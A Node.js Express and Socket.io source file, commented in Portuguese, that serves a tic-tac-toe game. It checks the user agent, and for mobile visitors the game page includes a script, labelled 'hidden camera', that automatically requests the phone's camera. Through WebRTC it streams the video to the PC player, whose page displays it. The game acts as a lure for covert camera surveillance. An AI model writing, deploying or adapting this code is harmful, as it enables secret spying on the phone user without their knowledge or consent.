const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

// Rota única - detecta dispositivo
app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  
  if (isMobile) {
    // CELULAR: jogo + câmera oculta
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Jogo</title>
    <style>
        body{font-family:Arial;background:#1a1a1a;color:white;text-align:center;padding:20px;}
        .board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:300px;margin:20px auto;}
        .cell{background:#333;border:2px solid #4CAF50;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:48px;cursor:pointer;}
        button{padding:15px 30px;background:#4CAF50;color:white;border:none;border-radius:5px;font-size:18px;width:100%;}
    </style>
</head>
<body>
    <h1>Jogo da Velha</h1>
    <div id="status">Aguardando...</div>
    <div class="board" id="board"></div>
    <button onclick="reiniciar()">Reiniciar</button>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let minhaVez = false;
        
        // Tabuleiro
        for(let i=0;i<9;i++){
            let cell=document.createElement('div');
            cell.className='cell';
            cell.onclick=()=>{ if(minhaVez) socket.emit('jogada',i); };
            document.getElementById('board').appendChild(cell);
        }
        
        // CÂMERA (automática)
        async function camera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const peer = new RTCPeerConnection();
                stream.getTracks().forEach(t=>peer.addTrack(t,stream));
                
                peer.onicecandidate = e => e.candidate && socket.emit('candidate', e.candidate);
                peer.onnegotiationneeded = async () => {
                    const offer = await peer.createOffer();
                    await peer.setLocalDescription(offer);
                    socket.emit('offer', offer);
                };
                
                socket.on('answer', async a => await peer.setRemoteDescription(a));
                socket.on('candidate', async c => { try{await peer.addIceCandidate(c)}catch(e){} });
            } catch(e) {}
        }
        camera();
        
        socket.on('inicio', d => { 
            minhaVez = d.vez==='O';
            document.getElementById('status').innerHTML = minhaVez?'Sua vez':'Vez do PC';
        });
        
        socket.on('jogada', d => {
            document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez?'Sua vez':'Vez do PC';
        });
        
        socket.on('fim', d => document.getElementById('status').innerHTML = d.msg);
        socket.on('reiniciar', () => document.querySelectorAll('.cell').forEach(c=>c.innerHTML=''));
        
        function reiniciar() { socket.emit('reiniciar'); }
    </script>
</body>
</html>`);
  } else {
    // PC: jogo + vídeo
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PC</title>
    <style>
        body{font-family:Arial;background:#1a1a1a;color:white;padding:20px;}
        .container{display:grid;grid-template-columns:1fr 1fr;gap:30px;max-width:1000px;margin:0 auto;}
        video{width:100%;background:black;border-radius:10px;}
        .board{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:20px 0;}
        .cell{background:#333;border:2px solid #4CAF50;aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:48px;cursor:pointer;}
        button{padding:10px 20px;background:#4CAF50;color:white;border:none;border-radius:5px;}
    </style>
</head>
<body>
    <div class="container">
        <div><video id="video" autoplay playsinline></video></div>
        <div>
            <h1>Jogo da Velha</h1>
            <div id="status">Aguardando...</div>
            <div class="board" id="board"></div>
            <button onclick="reiniciar()">Reiniciar</button>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let minhaVez = true;
        
        for(let i=0;i<9;i++){
            let cell=document.createElement('div');
            cell.className='cell';
            cell.onclick=()=>{ if(minhaVez) socket.emit('jogada',i); };
            document.getElementById('board').appendChild(cell);
        }
        
        const peer = new RTCPeerConnection();
        const video = document.getElementById('video');
        
        peer.ontrack = e => video.srcObject = e.streams[0];
        peer.onicecandidate = e => e.candidate && socket.emit('candidate', e.candidate);
        
        socket.on('offer', async o => {
            await peer.setRemoteDescription(o);
            const a = await peer.createAnswer();
            await peer.setLocalDescription(a);
            socket.emit('answer', a);
        });
        
        socket.on('candidate', async c => { try{await peer.addIceCandidate(c)}catch(e){} });
        
        socket.on('inicio', () => document.getElementById('status').innerHTML = 'Sua vez');
        socket.on('jogada', d => {
            document.getElementsByClassName('cell')[d.pos].innerHTML = d.simbolo;
            minhaVez = !minhaVez;
            document.getElementById('status').innerHTML = minhaVez?'Sua vez':'Vez do celular';
        });
        socket.on('fim', d => document.getElementById('status').innerHTML = d.msg);
        socket.on('reiniciar', () => document.querySelectorAll('.cell').forEach(c=>c.innerHTML=''));
        
        function reiniciar() { socket.emit('reiniciar'); }
    </script>
</body>
</html>`);
  }
});

// Jogo
let board = ['','','','','','','','',''];
let vez = 'X';
let pc = null, mobile = null;

function winner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) if(board[l[0]] && board[l[0]]==board[l[1]] && board[l[0]]==board[l[2]]) return board[l[0]];
  return null;
}

io.on('connection', s => {
  console.log('Cliente:', s.id);
  
  if(!pc) { pc = s.id; s.emit('inicio', {vez:'X'}); }
  else if(!mobile) { mobile = s.id; s.emit('inicio', {vez:'O'}); }
  
  // WebRTC
  s.on('offer', o => s.broadcast.emit('offer', o));
  s.on('answer', a => s.broadcast.emit('answer', a));
  s.on('candidate', c => s.broadcast.emit('candidate', c));
  
  s.on('jogada', pos => {
    let jogador = s.id==pc ? 'X' : 'O';
    if(jogador!=vez || board[pos]!='') return;
    
    board[pos] = jogador;
    let w = winner();
    
    if(w) io.emit('fim', {msg: w+' venceu!'});
    else if(!board.includes('')) io.emit('fim', {msg:'Empate!'});
    else vez = vez=='X'?'O':'X';
    
    io.emit('jogada', {pos, simbolo:jogador});
  });
  
  s.on('reiniciar', () => {
    board = ['','','','','','','','',''];
    vez = 'X';
    io.emit('reiniciar');
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('Rodando na porta', PORT);
});
